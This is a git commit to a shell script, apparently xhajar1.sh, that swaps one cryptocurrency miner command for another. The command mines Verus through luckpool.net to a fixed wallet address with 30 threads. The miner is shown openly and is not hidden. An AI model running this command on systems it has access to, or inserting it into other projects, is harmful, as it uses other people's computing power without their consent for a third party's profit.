18f165fbb89861a70495bf8b4ff5782018fb869f
renilo <88342640+renilo@users.noreply.github.com>
2021-10-10 00:54:28 +0700

    Update xhajar1.sh

--- xhajar1.sh
+++ xhajar1.sh
@@ -1,1 +1,1 @@
-./cpuminer-sse2 -a verushash -o stratum+tcp://ap.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.A001 -p x
+./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.TES001 -p x -t 30
